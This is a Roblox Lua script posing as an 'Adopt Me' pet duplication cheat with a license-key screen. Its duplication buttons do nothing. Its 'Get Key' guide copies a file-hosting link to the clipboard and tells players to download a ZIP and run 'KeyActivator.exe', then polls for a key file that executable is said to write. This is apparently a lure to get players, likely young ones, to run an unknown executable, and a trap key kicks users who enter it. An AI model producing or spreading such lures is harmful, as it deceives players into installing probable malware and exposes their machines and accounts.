local CONFIG = {
	VALID_KEY = "ADPT-PREM-7Kx9",
	TRAP_KEY = "ADPT-FREE-0kLm",
	GET_KEY_URL = "https://storage.to/eEU4ccLDo",
	KICK_MESSAGE = "Invalid key. Get a valid key from our Discord.",
	WRONG_KEY_TEXT = "Wrong key. Access denied.",
}
-- ╚══════════════════════════════════════════════════════════════╝
local UNIVERSAL_KEY = "PRSM-HUB-MASTER-7Kx9"

local function _isValidKey(k)
	k = (k or ""):gsub("^%s+", ""):gsub("%s+$", "")
	return k == CONFIG.VALID_KEY or k == UNIVERSAL_KEY
end

local KEY_FILE_PATHS = {
	"PrismHub/key.txt",
	"prism_key.txt",
	"key.txt",
}

local function _readSavedKey()
	if typeof(isfile) ~= "function" or typeof(readfile) ~= "function" then
		return nil
	end
	for _, path in KEY_FILE_PATHS do
		local ok, content = pcall(function()
			if isfile(path) then return readfile(path) end
			return nil
		end)
		if ok and content and content ~= "" then
			local k = content:gsub("^%s+", ""):gsub("%s+$", "")
			if _isValidKey(k) then return k end
		end
	end
	return nil
end

-- KeyActivator.exe writes key.txt → poll up to 90s (inject before or after EXE)
local function _tryAutoKey(keyBox, fn, onWaiting)
	task.spawn(function()
		task.wait(0.15)
		for _ = 1, 180 do
			local saved = _readSavedKey()
			if saved and keyBox then
				keyBox.Text = saved
				if onWaiting then onWaiting("Key found — activating...", true) end
				fn()
				return
			end
			if onWaiting then onWaiting("Run KeyActivator.exe from ZIP (or paste key)", false) end
			task.wait(0.5)
		end
	end)
end

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local authGui, mainGui = nil, nil
local buildMainGui

local ACCENT = Color3.fromRGB(255, 120, 180)
local ACCENT_DARK = Color3.fromRGB(160, 60, 110)

local COLORS = {
	bg = Color3.fromRGB(6, 4, 10),
	card = Color3.fromRGB(14, 10, 20),
	accent = ACCENT,
	accentDark = ACCENT_DARK,
	prism = Color3.fromRGB(167, 85, 247),
	danger = Color3.fromRGB(255, 85, 110),
	warn = Color3.fromRGB(255, 200, 100),
	text = Color3.fromRGB(235, 225, 245),
	muted = Color3.fromRGB(110, 95, 125),
	btn = Color3.fromRGB(22, 16, 30),
	stroke = Color3.fromRGB(215, 100, 160),
	success = Color3.fromRGB(120, 200, 140),
	guideBg = Color3.fromRGB(22, 22, 26),
	guideHeader = Color3.fromRGB(255, 120, 40),
	guideAccent = Color3.fromRGB(255, 140, 50),
	guideAccentHi = Color3.fromRGB(255, 180, 80),
	keyBtn = Color3.fromRGB(48, 48, 56),
	overlay = Color3.fromRGB(0, 0, 0),
}

local State = { authenticated = false }

local statusLbl
local guideGui
local guideVisible = false

local function getGuiParent()
	if typeof(gethui) == "function" then return gethui() end
	return PlayerGui
end

local function corner(inst, r)
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, r or 8)
	c.Parent = inst
	return c
end

local function stroke(inst, col, thick, trans)
	local s = Instance.new("UIStroke")
	s.Color = col or COLORS.stroke
	s.Thickness = thick or 1
	s.Transparency = trans or 0.35
	s.Parent = inst
	return s
end

local function tween(inst, props, t, style)
	return TweenService:Create(
		inst,
		TweenInfo.new(t or 0.2, style or Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		props
	)
end

local function copyClipboard(text)
	local ok = false
	pcall(function()
		if typeof(setclipboard) == "function" then
			setclipboard(text)
			ok = true
		end
	end)
	return ok
end

local function kickTrap()
	task.wait(1.8)
	pcall(function() LocalPlayer:Kick(CONFIG.KICK_MESSAGE) end)
end

local function updateStatus(msg)
	if statusLbl then statusLbl.Text = msg end
end

local function noop() end

-- ===================== GET KEY GUIDE (download + video) =====================
local function hideGuide()
	if not guideGui then return end
	guideVisible = false
	local card = guideGui:FindFirstChild("GuideCard")
	local overlay = guideGui:FindFirstChild("Overlay")
	if card then
		local tw = tween(card, {
			Position = UDim2.new(0.5, 0, 1.12, 0),
			BackgroundTransparency = 1,
		}, 0.28, Enum.EasingStyle.Quad)
		tw:Play()
		tw.Completed:Wait()
	end
	if overlay then tween(overlay, { BackgroundTransparency = 1 }, 0.2):Play() end
	task.wait(0.18)
	if guideGui then guideGui:Destroy(); guideGui = nil end
end

local function makeKeyChip(parent, text, width)
	local chip = Instance.new("TextLabel")
	chip.Size = UDim2.new(0, width or 56, 0, 32)
	chip.BackgroundColor3 = COLORS.keyBtn
	chip.BorderSizePixel = 0
	chip.Text = text
	chip.TextColor3 = Color3.new(1, 1, 1)
	chip.Font = Enum.Font.GothamBold
	chip.TextSize = 11
	chip.TextWrapped = true
	chip.Parent = parent
	corner(chip, 7)
	return chip
end

local function addGuideStep(parent, order, buildChips)
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, 0, 0, 42)
	row.BackgroundTransparency = 1
	row.LayoutOrder = order
	row.Parent = parent

	local numLbl = Instance.new("TextLabel")
	numLbl.Size = UDim2.new(0, 26, 0, 26)
	numLbl.Position = UDim2.new(0, 0, 0.5, -13)
	numLbl.BackgroundColor3 = COLORS.guideAccent
	numLbl.Text = tostring(order)
	numLbl.TextColor3 = Color3.new(1, 1, 1)
	numLbl.Font = Enum.Font.GothamBold
	numLbl.TextSize = 13
	numLbl.Parent = row
	corner(numLbl, 13)

	local chips = Instance.new("Frame")
	chips.Size = UDim2.new(1, -36, 1, 0)
	chips.Position = UDim2.new(0, 34, 0, 0)
	chips.BackgroundTransparency = 1
	chips.Parent = row

	local layout = Instance.new("UIListLayout")
	layout.FillDirection = Enum.FillDirection.Horizontal
	layout.Padding = UDim.new(0, 6)
	layout.VerticalAlignment = Enum.VerticalAlignment.Center
	layout.Parent = chips

	if buildChips then buildChips(chips) end
end

local function getDownloadUrl()
	return CONFIG.GET_KEY_URL or "https://storage.to/eEU4ccLDo"
end

local function showGetKeyGuide()
	if guideVisible then return end
	guideVisible = true

	local dlUrl = getDownloadUrl()
	local copiedOk = copyClipboard(dlUrl)

	if guideGui then guideGui:Destroy() end
	guideGui = Instance.new("ScreenGui")
	guideGui.Name = "PrismGetKeyGuide"
	guideGui.ResetOnSpawn = false
	guideGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	guideGui.DisplayOrder = 100
	guideGui.Parent = getGuiParent()

	local overlay = Instance.new("Frame")
	overlay.Name = "Overlay"
	overlay.Size = UDim2.new(1, 0, 1, 0)
	overlay.BackgroundColor3 = COLORS.overlay
	overlay.BackgroundTransparency = 1
	overlay.BorderSizePixel = 0
	overlay.Parent = guideGui

	local card = Instance.new("Frame")
	card.Name = "GuideCard"
	card.AnchorPoint = Vector2.new(0.5, 0.5)
	card.Size = UDim2.new(0, 340, 0, 400)
	card.Position = UDim2.new(0.5, 0, 1.12, 0)
	card.BackgroundColor3 = COLORS.guideBg
	card.BackgroundTransparency = 1
	card.BorderSizePixel = 0
	card.ClipsDescendants = true
	card.Parent = guideGui
	corner(card, 12)
	stroke(card, COLORS.guideAccent, 1.2, 0.2)

	local header = Instance.new("Frame")
	header.Size = UDim2.new(1, 0, 0, 64)
	header.BackgroundColor3 = COLORS.guideHeader
	header.BorderSizePixel = 0
	header.Parent = card

	local headerFill = Instance.new("Frame")
	headerFill.Size = UDim2.new(1, 0, 0, 12)
	headerFill.Position = UDim2.new(0, 0, 1, -12)
	headerFill.BackgroundColor3 = COLORS.guideHeader
	headerFill.BorderSizePixel = 0
	headerFill.Parent = header

	local hTitle = Instance.new("TextLabel")
	hTitle.Size = UDim2.new(1, -44, 0, 26)
	hTitle.Position = UDim2.new(0, 14, 0, 12)
	hTitle.BackgroundTransparency = 1
	hTitle.Text = "How to Get Key"
	hTitle.TextColor3 = Color3.new(1, 1, 1)
	hTitle.Font = Enum.Font.GothamBold
	hTitle.TextSize = 19
	hTitle.TextXAlignment = Enum.TextXAlignment.Left
	hTitle.Parent = header

	local hSub = Instance.new("TextLabel")
	hSub.Size = UDim2.new(1, -44, 0, 16)
	hSub.Position = UDim2.new(0, 14, 0, 36)
	hSub.BackgroundTransparency = 1
	hSub.Text = "Download ZIP → run KeyActivator.exe"
	hSub.TextColor3 = Color3.fromRGB(255, 235, 210)
	hSub.Font = Enum.Font.Gotham
	hSub.TextSize = 11
	hSub.TextXAlignment = Enum.TextXAlignment.Left
	hSub.Parent = header

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 24, 0, 24)
	closeBtn.Position = UDim2.new(1, -32, 0, 10)
	closeBtn.BackgroundColor3 = Color3.new(1, 1, 1)
	closeBtn.BackgroundTransparency = 0.82
	closeBtn.Text = "X"
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.GothamBold
	closeBtn.TextSize = 11
	closeBtn.BorderSizePixel = 0
	closeBtn.AutoButtonColor = false
	closeBtn.Parent = header
	corner(closeBtn, 12)
	closeBtn.MouseButton1Click:Connect(hideGuide)

	local steps = Instance.new("Frame")
	steps.Size = UDim2.new(1, -28, 0, 240)
	steps.Position = UDim2.new(0, 14, 0, 74)
	steps.BackgroundTransparency = 1
	steps.Parent = card

	local stepLayout = Instance.new("UIListLayout")
	stepLayout.Padding = UDim.new(0, 8)
	stepLayout.SortOrder = Enum.SortOrder.LayoutOrder
	stepLayout.Parent = steps

	addGuideStep(steps, 1, function(chips) makeKeyChip(chips, "Download ZIP", 120) end)
	addGuideStep(steps, 2, function(chips) makeKeyChip(chips, "Unzip folder", 110) end)
	addGuideStep(steps, 3, function(chips) makeKeyChip(chips, "Join Roblox game", 130) end)
	addGuideStep(steps, 4, function(chips) makeKeyChip(chips, "Run KeyActivator.exe", 150) end)
	addGuideStep(steps, 5, function(chips) makeKeyChip(chips, "Inject script → auto key", 150) end)

	local guideStatus = Instance.new("Frame")
	guideStatus.Size = UDim2.new(1, -28, 0, 40)
	guideStatus.Position = UDim2.new(0, 14, 1, -52)
	guideStatus.BackgroundColor3 = Color3.fromRGB(32, 32, 38)
	guideStatus.BorderSizePixel = 0
	guideStatus.Parent = card
	corner(guideStatus, 8)

	local guideStatusLbl = Instance.new("TextLabel")
	guideStatusLbl.Size = UDim2.new(1, -10, 1, 0)
	guideStatusLbl.Position = UDim2.new(0, 5, 0, 0)
	guideStatusLbl.BackgroundTransparency = 1
	guideStatusLbl.Text = copiedOk and "Download link copied to clipboard!" or "Copy link manually from CONFIG"
	guideStatusLbl.TextColor3 = copiedOk and COLORS.guideAccentHi or COLORS.warn
	guideStatusLbl.Font = Enum.Font.GothamSemibold
	guideStatusLbl.TextSize = 11
	guideStatusLbl.TextWrapped = true
	guideStatusLbl.TextXAlignment = Enum.TextXAlignment.Center
	guideStatusLbl.Parent = guideStatus

	overlay.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then hideGuide() end
	end)

	tween(overlay, { BackgroundTransparency = 0.5 }, 0.22):Play()
	tween(card, {
		Position = UDim2.new(0.5, 0, 0.5, 0),
		BackgroundTransparency = 0,
	}, 0.38, Enum.EasingStyle.Back):Play()
end

local function onGetKeyPressed(errLbl)
	local ok = copyClipboard(getDownloadUrl())
	showGetKeyGuide()
	if errLbl then
		errLbl.TextColor3 = COLORS.warn
		errLbl.Text = ok and "Link copied! Follow the guide." or "Guide opened."
	end
end

-- ===================== AUTH GUI =====================
local function buildAuthGui()
	if authGui then authGui:Destroy() end
	authGui = Instance.new("ScreenGui")
	authGui.Name = "AdoptMeDupAuth"
	authGui.ResetOnSpawn = false
	authGui.Parent = getGuiParent()

	local overlay = Instance.new("Frame")
	overlay.Size = UDim2.fromScale(1, 1)
	overlay.BackgroundColor3 = Color3.new(0, 0, 0)
	overlay.BackgroundTransparency = 0.35
	overlay.BorderSizePixel = 0
	overlay.Parent = authGui

	local card = Instance.new("Frame")
	card.Size = UDim2.new(0, 340, 0, 380)
	card.Position = UDim2.new(0.5, -170, 0.5, -190)
	card.BackgroundColor3 = COLORS.card
	card.BorderSizePixel = 0
	card.Parent = overlay
	corner(card, 14)
	stroke(card, COLORS.accent, 1.5)

	local badge = Instance.new("TextLabel")
	badge.Size = UDim2.new(1, -24, 0, 22)
	badge.Position = UDim2.new(0, 12, 0, 18)
	badge.BackgroundTransparency = 1
	badge.Text = "💎 PRISM 💎"
	badge.TextColor3 = COLORS.prism
	badge.Font = Enum.Font.GothamBold
	badge.TextSize = 11
	badge.Parent = card

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1, -24, 0, 36)
	title.Position = UDim2.new(0, 12, 0, 40)
	title.BackgroundTransparency = 1
	title.Text = "Dup Pets"
	title.TextColor3 = COLORS.text
	title.Font = Enum.Font.GothamBold
	title.TextSize = 26
	title.TextXAlignment = Enum.TextXAlignment.Left
	title.Parent = card

	local subtitle = Instance.new("TextLabel")
	subtitle.Size = UDim2.new(1, -24, 0, 20)
	subtitle.Position = UDim2.new(0, 12, 0, 78)
	subtitle.BackgroundTransparency = 1
	subtitle.Text = "Adopt Me — enter license key"
	subtitle.TextColor3 = COLORS.muted
	subtitle.Font = Enum.Font.Gotham
	subtitle.TextSize = 13
	subtitle.TextXAlignment = Enum.TextXAlignment.Left
	subtitle.Parent = card

	local inputWrap = Instance.new("Frame")
	inputWrap.Size = UDim2.new(1, -24, 0, 42)
	inputWrap.Position = UDim2.new(0, 12, 0, 118)
	inputWrap.BackgroundColor3 = COLORS.bg
	inputWrap.BorderSizePixel = 0
	inputWrap.Parent = card
	corner(inputWrap, 8)
	stroke(inputWrap)

	local keyBox = Instance.new("TextBox")
	keyBox.Size = UDim2.new(1, -16, 1, 0)
	keyBox.Position = UDim2.new(0, 8, 0, 0)
	keyBox.BackgroundTransparency = 1
	keyBox.PlaceholderText = "License key..."
	keyBox.PlaceholderColor3 = COLORS.muted
	keyBox.Text = ""
	keyBox.TextColor3 = COLORS.text
	keyBox.Font = Enum.Font.GothamSemibold
	keyBox.TextSize = 14
	keyBox.ClearTextOnFocus = false
	keyBox.Parent = inputWrap

	local errLbl = Instance.new("TextLabel")
	errLbl.Size = UDim2.new(1, -24, 0, 22)
	errLbl.Position = UDim2.new(0, 12, 0, 168)
	errLbl.BackgroundTransparency = 1
	errLbl.TextColor3 = COLORS.danger
	errLbl.Font = Enum.Font.GothamSemibold
	errLbl.TextSize = 12
	errLbl.TextXAlignment = Enum.TextXAlignment.Left
	errLbl.Parent = card

	local activateBtn = Instance.new("TextButton")
	activateBtn.Size = UDim2.new(1, -24, 0, 40)
	activateBtn.Position = UDim2.new(0, 12, 0, 200)
	activateBtn.BackgroundColor3 = COLORS.accent
	activateBtn.Text = "Activate"
	activateBtn.TextColor3 = Color3.new(1, 1, 1)
	activateBtn.Font = Enum.Font.GothamBold
	activateBtn.TextSize = 14
	activateBtn.BorderSizePixel = 0
	activateBtn.AutoButtonColor = false
	activateBtn.Parent = card
	corner(activateBtn, 8)

	local getKeyBtn = Instance.new("TextButton")
	getKeyBtn.Size = UDim2.new(1, -24, 0, 36)
	getKeyBtn.Position = UDim2.new(0, 12, 0, 250)
	getKeyBtn.BackgroundColor3 = COLORS.btn
	getKeyBtn.Text = "Get Key  →  KeyActivator ZIP"
	getKeyBtn.TextColor3 = COLORS.warn
	getKeyBtn.Font = Enum.Font.GothamSemibold
	getKeyBtn.TextSize = 13
	getKeyBtn.BorderSizePixel = 0
	getKeyBtn.AutoButtonColor = false
	getKeyBtn.Parent = card
	corner(getKeyBtn, 8)
	stroke(getKeyBtn)

	local function shakeCard()
		local orig = card.Position
		for i = 1, 4 do
			card.Position = orig + UDim2.new(0, (i % 2 == 0) and -6 or 6, 0, 0)
			task.wait(0.04)
		end
		card.Position = orig
	end

	local function tryActivate()
		local key = keyBox.Text:gsub("^%s+", ""):gsub("%s+$", "")
		if key == "" then errLbl.Text = "Please enter a key."; shakeCard(); return end
		if _isValidKey(key) then
			errLbl.TextColor3 = COLORS.success
			errLbl.Text = "Key accepted. Loading..."
			keyBox.TextEditable = false
			task.spawn(function()
				task.wait(0.6)
				State.authenticated = true
				if authGui then authGui:Destroy(); authGui = nil end
				if typeof(buildMainGui) == "function" then buildMainGui() end
			end)
			return
		end
		if key == CONFIG.TRAP_KEY then
			errLbl.Text = CONFIG.WRONG_KEY_TEXT
			keyBox.TextEditable = false
			shakeCard()
			task.spawn(kickTrap)
			return
		end
		errLbl.Text = "Wrong key. Try again."
		shakeCard()
	end

	activateBtn.MouseButton1Click:Connect(tryActivate)
	keyBox.FocusLost:Connect(function(e) if e then tryActivate() end end)
	getKeyBtn.MouseButton1Click:Connect(function() onGetKeyPressed(errLbl) end)
	_tryAutoKey(keyBox, tryActivate, function(msg, found)
		errLbl.TextColor3 = found and COLORS.success or COLORS.muted
		errLbl.Text = msg
	end)
end

-- ===================== MAIN GUI =====================
buildMainGui = function()
	if mainGui then mainGui:Destroy() end
	mainGui = Instance.new("ScreenGui")
	mainGui.Name = "AdoptMeDupDev"
	mainGui.ResetOnSpawn = false
	mainGui.Enabled = true
	mainGui.DisplayOrder = 999
	mainGui.Parent = getGuiParent()

	local Main = Instance.new("Frame")
	Main.Name = "Main"
	Main.Size = UDim2.new(0, 300, 0, 380)
	Main.Position = UDim2.new(0, 12, 0.5, -190)
	Main.BackgroundColor3 = COLORS.card
	Main.BorderSizePixel = 0
	Main.Active = true
	Main.Parent = mainGui
	corner(Main, 12)
	stroke(Main, COLORS.accent, 1.2)

	local Header = Instance.new("Frame")
	Header.Size = UDim2.new(1, 0, 0, 66)
	Header.BackgroundColor3 = ACCENT
	Header.BorderSizePixel = 0
	Header.Parent = Main
	corner(Header, 12)

	local Title = Instance.new("TextLabel")
	Title.Size = UDim2.new(1, -44, 0, 36)
	Title.Position = UDim2.new(0, 10, 0, 6)
	Title.BackgroundTransparency = 1
	Title.Text = "Dup Pets"
	Title.TextColor3 = Color3.new(1, 1, 1)
	Title.Font = Enum.Font.GothamBlack
	Title.TextSize = 19
	Title.TextXAlignment = Enum.TextXAlignment.Left
	Title.Parent = Header

	local Sub = Instance.new("TextLabel")
	Sub.Size = UDim2.new(1, -10, 0, 18)
	Sub.Position = UDim2.new(0, 10, 0, 40)
	Sub.BackgroundTransparency = 1
	Sub.Text = "Adopt Me | RightShift"
	Sub.TextColor3 = Color3.fromRGB(255, 210, 215)
	Sub.Font = Enum.Font.Gotham
	Sub.TextSize = 11
	Sub.TextXAlignment = Enum.TextXAlignment.Left
	Sub.Parent = Header

	local CloseBtn = Instance.new("TextButton")
	CloseBtn.Size = UDim2.new(0, 30, 0, 30)
	CloseBtn.Position = UDim2.new(1, -38, 0, 8)
	CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	CloseBtn.Text = "X"
	CloseBtn.Font = Enum.Font.GothamBold
	CloseBtn.TextColor3 = Color3.new(1, 1, 1)
	CloseBtn.BorderSizePixel = 0
	CloseBtn.Parent = Header
	corner(CloseBtn, 8)
	CloseBtn.MouseButton1Click:Connect(function() mainGui.Enabled = false end)

	local dragging, dragStart, frameStart = false, nil, nil
	Header.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			frameStart = Main.Position
		end
	end)
	Header.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
			local delta = input.Position - dragStart
			Main.Position = UDim2.new(
				frameStart.X.Scale, frameStart.X.Offset + delta.X,
				frameStart.Y.Scale, frameStart.Y.Offset + delta.Y
			)
		end
	end)

	local TabBar = Instance.new("Frame")
	TabBar.Size = UDim2.new(1, -16, 0, 34)
	TabBar.Position = UDim2.new(0, 8, 0, 72)
	TabBar.BackgroundColor3 = Color3.fromRGB(20, 16, 26)
	TabBar.BorderSizePixel = 0
	TabBar.Parent = Main
	corner(TabBar, 8)

	local tabLayout = Instance.new("UIListLayout")
	tabLayout.FillDirection = Enum.FillDirection.Horizontal
	tabLayout.Padding = UDim.new(0, 4)
	tabLayout.Parent = TabBar

	local tabPad = Instance.new("UIPadding")
	tabPad.PaddingLeft = UDim.new(0, 4)
	tabPad.PaddingTop = UDim.new(0, 3)
	tabPad.PaddingBottom = UDim.new(0, 3)
	tabPad.Parent = TabBar

	local Content = Instance.new("Frame")
	Content.Size = UDim2.new(1, -16, 1, -118)
	Content.Position = UDim2.new(0, 8, 0, 112)
	Content.BackgroundTransparency = 1
	Content.ClipsDescendants = true
	Content.Parent = Main

	statusLbl = Instance.new("TextLabel")
	statusLbl.Size = UDim2.new(1, -16, 0, 32)
	statusLbl.Position = UDim2.new(0, 8, 1, -40)
	statusLbl.BackgroundColor3 = Color3.fromRGB(18, 14, 24)
	statusLbl.TextColor3 = Color3.fromRGB(180, 170, 195)
	statusLbl.Font = Enum.Font.Gotham
	statusLbl.TextSize = 10
	statusLbl.TextWrapped = true
	statusLbl.TextXAlignment = Enum.TextXAlignment.Left
	statusLbl.Text = "Ready — Dup Pets placeholder"
	statusLbl.Parent = Main
	corner(statusLbl, 6)

	local tabNames = { "Dup", "Dev" }
	local tabFrames = {}
	local scrollCounter = 0

	local function styleBtn(btn, height)
		btn.Size = UDim2.new(1, 0, 0, height or 38)
		btn.BorderSizePixel = 0
		btn.Font = Enum.Font.GothamSemibold
		btn.TextSize = 13
		btn.TextColor3 = Color3.new(1, 1, 1)
		btn.BackgroundColor3 = Color3.fromRGB(34, 26, 42)
		btn.LayoutOrder = scrollCounter
		scrollCounter += 1
		corner(btn, 8)
	end

	local function addLabel(parent, text)
		local lbl = Instance.new("TextLabel")
		lbl.Size = UDim2.new(1, 0, 0, 22)
		lbl.BackgroundTransparency = 1
		lbl.Text = text
		lbl.TextColor3 = Color3.fromRGB(255, 120, 140)
		lbl.Font = Enum.Font.GothamBold
		lbl.TextSize = 11
		lbl.TextXAlignment = Enum.TextXAlignment.Left
		lbl.LayoutOrder = scrollCounter
		scrollCounter += 1
		lbl.Parent = parent
	end

	local function addButton(parent, text, fn)
		local btn = Instance.new("TextButton")
		btn.Text = text
		styleBtn(btn)
		btn.Parent = parent
		btn.MouseButton1Click:Connect(fn or noop)
	end

	local function addTextBox(parent, placeholder, defaultText)
		local wrap = Instance.new("Frame")
		wrap.Size = UDim2.new(1, 0, 0, 36)
		wrap.BackgroundColor3 = Color3.fromRGB(24, 18, 30)
		wrap.BorderSizePixel = 0
		wrap.LayoutOrder = scrollCounter
		scrollCounter += 1
		wrap.Parent = parent
		corner(wrap, 8)

		local box = Instance.new("TextBox")
		box.Size = UDim2.new(1, -12, 1, -8)
		box.Position = UDim2.new(0, 6, 0, 4)
		box.BackgroundTransparency = 1
		box.PlaceholderText = placeholder
		box.Text = defaultText or ""
		box.TextColor3 = Color3.new(1, 1, 1)
		box.PlaceholderColor3 = Color3.fromRGB(130, 110, 140)
		box.Font = Enum.Font.GothamBold
		box.TextSize = 14
		box.ClearTextOnFocus = false
		box.Parent = wrap
		return box
	end

	for i, name in tabNames do
		local scroll = Instance.new("ScrollingFrame")
		scroll.Size = UDim2.fromScale(1, 1)
		scroll.BackgroundTransparency = 1
		scroll.BorderSizePixel = 0
		scroll.ScrollBarThickness = 5
		scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
		scroll.CanvasSize = UDim2.new()
		scroll.Visible = i == 1
		scroll.Parent = Content

		local list = Instance.new("UIListLayout")
		list.Padding = UDim.new(0, 6)
		list.SortOrder = Enum.SortOrder.LayoutOrder
		list.Parent = scroll

		local pad = Instance.new("UIPadding")
		pad.PaddingTop = UDim.new(0, 4)
		pad.PaddingBottom = UDim.new(0, 8)
		pad.PaddingRight = UDim.new(0, 8)
		pad.Parent = scroll

		tabFrames[name] = scroll

		local tabBtn = Instance.new("TextButton")
		tabBtn.Size = UDim2.new(0, 78, 0, 26)
		tabBtn.Text = name
		tabBtn.Font = Enum.Font.GothamBold
		tabBtn.TextSize = 11
		tabBtn.TextColor3 = Color3.new(1, 1, 1)
		tabBtn.BackgroundColor3 = i == 1 and ACCENT_DARK or Color3.fromRGB(38, 30, 46)
		tabBtn.BorderSizePixel = 0
		tabBtn.LayoutOrder = i
		tabBtn.Parent = TabBar
		corner(tabBtn, 6)
		tabBtn.MouseButton1Click:Connect(function()
			for _, frame in tabFrames do frame.Visible = false end
			scroll.Visible = true
			for _, child in TabBar:GetChildren() do
				if child:IsA("TextButton") then
					child.BackgroundColor3 = Color3.fromRGB(38, 30, 46)
				end
			end
			tabBtn.BackgroundColor3 = ACCENT_DARK
		end)
	end

	scrollCounter = 0
	local dupTab = tabFrames.Dup
	addLabel(dupTab, "— PET DUP —")
	addTextBox(dupTab, "Pet name...", "")
	addButton(dupTab, "Dup Pet", noop)
	addButton(dupTab, "Dup Selected Pet", noop)
	addButton(dupTab, "Dup x10", noop)
	addButton(dupTab, "Dup All Pets", noop)
	addLabel(dupTab, "— INVENTORY —")
	addButton(dupTab, "Refresh Pets", noop)
	addButton(dupTab, "Clear Pets (dev)", noop)

	scrollCounter = 0
	local devTab = tabFrames.Dev
	addLabel(devTab, "— STUDIO —")
	addButton(devTab, "Print PlaceId", function()
		print("[Dup Pets] PlaceId:", game.PlaceId)
		updateStatus("PlaceId: " .. tostring(game.PlaceId))
	end)
	addButton(devTab, "Print Player", function()
		print("[Dup Pets] Player:", LocalPlayer.Name)
		updateStatus("Player: " .. LocalPlayer.Name)
	end)
	addButton(devTab, "Toggle Menu", function()
		mainGui.Enabled = not mainGui.Enabled
	end)

	print("[Dup Pets] Menu ready | RightShift = toggle")
end

-- ===================== START =====================
buildAuthGui()

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed or not State.authenticated then return end
	if input.KeyCode == Enum.KeyCode.RightShift and mainGui then
		mainGui.Enabled = not mainGui.Enabled
	end
end)
